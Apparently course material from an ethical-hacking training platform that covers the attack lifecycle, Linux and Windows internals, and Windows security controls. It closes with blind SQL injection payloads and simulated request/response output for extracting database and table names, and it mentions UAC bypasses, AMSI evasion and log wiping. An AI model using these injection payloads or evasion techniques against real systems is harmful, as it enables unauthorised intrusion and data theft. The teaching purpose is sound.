title: Ethical Hacking
description: Foundational methodology and theoretical framework of ethical hacking, covering the five stages of the attack lifecycle.
concept: Ethical hacking follows a structured five-stage process: Reconnaissance, Scanning, Gaining Access, Maintaining Access, and Covering Tracks. This methodology ensures thorough vulnerability assessment and responsible disclosure.

tools.name: 01 Overview: Hacking Lifecycle
tools.description: The five stages of a professional penetration test.

commands.description: Gathering information about the target. Passive techniques like OSINT, DNS records, and website browsing.
Actively probing the network to discover open ports, services, and vulnerabilities.
Exploiting vulnerabilities (password cracking, social engineering, software flaws) to enter the system.
Establishing persistence via backdoors or remote access tools to assess long-term impact.
Removing logs and traces of activity to remain undetected and restore system state.

title: Fundamental Of Hacking
description: Master Linux & Windows internals, exploration tools, and detection techniques — the essential foundation for every ethical hacker.
concept: Before exploiting any system, you must understand how it works. This module covers the full spectrum: Linux CLI mastery, filesystem navigation, user/permission management, network analysis, service exploration tools like Nmap and Gobuster, and defensive detection with IDS and log analysis. Both attacker and defender perspectives are covered.

tools.name: 01 Linux: Shell & Terminal
tools.description: The shell is the interface between you and the operating system kernel. Understanding it is the first step to mastering Linux.

commands.description: Computer hardware (CPU, RAM, Disk) is useless on its own — the Kernel manages them but only understands binary. The Shell translates your human-readable commands (e.g., 'ls') into machine language the kernel can execute. It then takes the kernel's response and displays it back in a readable format. Think of it as a translator between you and the machine.

CLI (Command Line Interface) uses a Terminal window where you type commands — powerful and scriptable. GUI (Graphical User Interface) uses windows, icons, and mouse clicks — user-friendly but less flexible for hacking tasks.
Prints the path of your current shell interpreter. This tells you which shell program processes your commands.
commands.simulation: /bin/bash

commands.description: Lists all available shells installed on the system. Useful to check what shells you can switch to.
commands.simulation:
/bin/sh
/bin/bash
/usr/bin/zsh
/usr/bin/fish
/bin/dash

commands.description: Bash (Bourne Again Shell): Default on most Linux distros, supports scripting. Zsh: Enhanced Bash with autocomplete, themes, and plugins (oh-my-zsh). Fish: User-friendly with syntax highlighting out of the box. Dash: Lightweight, used for system scripts.
Change your default shell to Zsh. Requires re-login to take effect.
commands.simulation: Shell changed.

tools.name: 01b Linux: Terminal Shortcuts
tools.description: Professional hackers rarely use the mouse. These keyboard shortcuts dramatically increase your speed in the terminal.

commands.description: SIGINT — Interrupt and immediately stop the currently running process. Essential when a scan or command hangs.
SIGTSTP — Suspend (pause) the current foreground process and return to the shell. Use 'bg' to continue it in background or 'fg' to resume.
Send EOF (End Of File). Exits the current shell session or closes input for commands like 'cat'.
Clear the terminal screen instantly (equivalent to typing 'clear'). The scrollback buffer is preserved.
Jump cursor to the beginning (A) or end (E) of the current line. Saves time when editing long commands.
Reverse-search through your command history. Start typing any part of a previous command to find it instantly.
Press Tab once to auto-complete file/command names. Press Tab twice to see all possible completions.
Repeat the last command. Common pattern: 'sudo !!' to re-run the last command with root privileges.

minal@ligerverse-os:~$ apt update
E: Could not open lock file - Permission denied
minal@ligerverse-os:~$ sudo !!
sudo apt update
Hit:1 http://archive.ubuntu.com/ubuntu jammy InRelease
Reading package lists... Done

commands.description: Search your command history for a specific tool. Shows line numbers you can re-execute with '!<number>'.

tools.name: 02b Linux: Filesystem Hierarchy
tools.description: Every Linux system follows the Filesystem Hierarchy Standard (FHS). Knowing what lives where is essential for both attacking and defending.

commands.description: Essential binaries: /bin contains user commands (ls, cp, cat, grep). /sbin contains system/admin commands (fdisk, reboot, iptables). These are available even in single-user recovery mode.

System-wide configuration files — the goldmine for attackers. Contains /etc/passwd (user accounts), /etc/shadow (password hashes), /etc/hosts (DNS overrides), /etc/crontab (scheduled tasks), /etc/ssh/sshd_config (SSH settings).
Variable data that changes during operation. /var/log contains ALL system logs (auth.log, syslog, apache2/). /var/www is the default web root for Apache. /var/mail stores user mailboxes.
World-writable temporary directories. Hackers use these for staging exploits because any user can write here. /tmp is on disk, /dev/shm is in RAM (faster, no disk trace). Both are cleared on reboot.
/home/<username> is the personal directory for regular users. /root is the superuser's home (not inside /home). User configs like .bashrc, .ssh/authorized_keys, and .bash_history live here.
Third-party and manually installed software. /opt is for self-contained packages. /usr/local/bin is for user-compiled binaries. Check these for custom or vulnerable applications.
Virtual filesystems exposing kernel and process info. /proc/version shows kernel version. /proc/<PID>/cmdline reveals running process commands. Invaluable for enumeration.

tools.name: 04b Linux: Advanced Redirection
tools.description: Linux uses three data streams: STDIN (0, input), STDOUT (1, normal output), and STDERR (2, error output). Mastering redirection lets you control where data flows.

commands.description: Redirect STDOUT to a file, overwriting existing content. The > operator creates the file if it doesn't exist. Use for saving scan results.

hello

commands.description: Append STDOUT to a file without overwriting. Use >> when you want to accumulate results from multiple commands.

world

commands.description: Redirect only STDERR (stream 2) to a file. Useful for capturing error messages separately while keeping normal output on screen.

tools.name: 08 Windows: Architecture & Files
tools.description: Windows has a fundamentally different architecture from Linux. Understanding its filesystem, registry, and internals is essential for attacking and defending Windows targets.

commands.description: NTFS (New Technology File System): Modern Windows default. Supports files >4GB, file-level security permissions (ACLs), journalling for crash recovery, and encryption (EFS). FAT32: Legacy format, no security features, 4GB file size limit. Still used on USB drives and older systems.

An NTFS feature that lets you hide data inside a file without changing its visible size. Example: 'notepad file.txt:hidden.txt' creates a hidden stream. Malware uses ADS to hide payloads. Detect with: 'dir /r' or 'streams.exe' from Sysinternals.

A hierarchical database storing all OS and application settings. Key hives: HKLM (machine-wide), HKCU (current user), HKCR (file associations). Attackers use it for persistence (Run keys), credential extraction, and disabling security.

C:\Windows\System32: Core OS binaries and DLLs. C:\Users\<name>: User profiles with Desktop, Documents, AppData. C:\Program Files: 64-bit software. C:\Program Files (x86): 32-bit software. C:\Windows\Temp: System temp files.

SAM (Security Account Manager): Stores local password hashes at C:\Windows\System32\config\SAM. SYSTEM: Contains the boot key to decrypt SAM. NTDS.dit: Active Directory database on Domain Controllers.

tools.name: 09 Windows: Security Measures
tools.description: Windows implements multiple security layers. Understanding these helps both in bypassing them (offensive) and hardening them (defensive).

commands.description: Prompts for consent/credentials before elevated operations. Levels range from 'Never notify' to 'Always notify'. Bypass techniques exist (fodhelper, eventvwr) but are regularly patched. Check level: msconfig > Tools > UAC.

Real-time antivirus with cloud-based detection. AMSI (Antimalware Scan Interface) inspects PowerShell scripts before execution. Attackers use obfuscation, AMSI bypasses, and in-memory execution to evade.
Full-volume encryption using AES-128 or AES-256. Protects data on lost/stolen devices. Recovery key is required if TPM fails. Can be managed via 'manage-bde' command or Group Policy.

Built-in stateful firewall with inbound/outbound rules per profile (Domain, Private, Public). Managed via 'netsh advfirewall' (CMD) or 'Get-NetFirewallRule' (PowerShell). Often misconfigured on internal networks.
Application whitelisting policies that restrict which executables, scripts, and DLLs can run. WDAC (Windows Defender Application Control) is the modern replacement. Bypass: DLL side-loading, LOLBins.

title: System Hacking
description: To discover hosts, services, and vulnerabilities efficiently in CTF environments, System Hacking is the foundation of any penetration test.
concept: System hacking is a multi-stage process starting with discovery and enumeration. Nmap is the industry standard for identifying open ports and service versions. For stealthier local network discovery, Netdiscover passively listens for ARP requests to find live hosts. Successful system hacking relies on meticulous scanning to identify weak services like outdated Apache servers, misconfigured SMB shares, or exposed RPC ports.

commands.command: admin' UNION SELECT 1,2,3 where database() like 's%';--
commands.usage: Brute-force characters to guess the database name one-by-one.
commands.simulation:
[Request] ?id=admin' AND (SELECT substring(database(),1,1))='w'-- -
[Response] HTTP 200 OK (Content length: 1500) -> First letter is 'w'

[Request] ?id=admin' AND (SELECT substring(database(),2,1))='e'-- -
[Response] HTTP 200 OK (Content length: 1500) -> Second letter is 'e'

[Request] ?id=admin' AND (SELECT substring(database(),3,1))='b'-- -
[Response] HTTP 200 OK (Content length: 1500) -> Third letter is 'b'

commands.command: admin' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_name like 'u%';--
commands.usage: Identify table names by observing the server's boolean response.
commands.simulation:
[Request] ?id=admin' AND (SELECT ascii(substring((SELECT table_name FROM information_schema.tables LIMIT 0,1),1,1)))>100-- -
[Response] HTTP 200 OK (True)

[Request] ?id=admin' AND (SELECT ascii(substring((SELECT table_name FROM information_schema.tables LIMIT 0,1),1,1)))>110-- -
[Response] HTTP 200 OK (True)

[Request] ?id=admin' AND (SELECT ascii(substring((SELECT table_name FROM information_schema.tables LIMIT 0,1),1,1)))=117-- -
[Response] HTTP 200 OK (True)

[Conclusion] 117 is ASCII 'u'. First letter of table is 'u'.
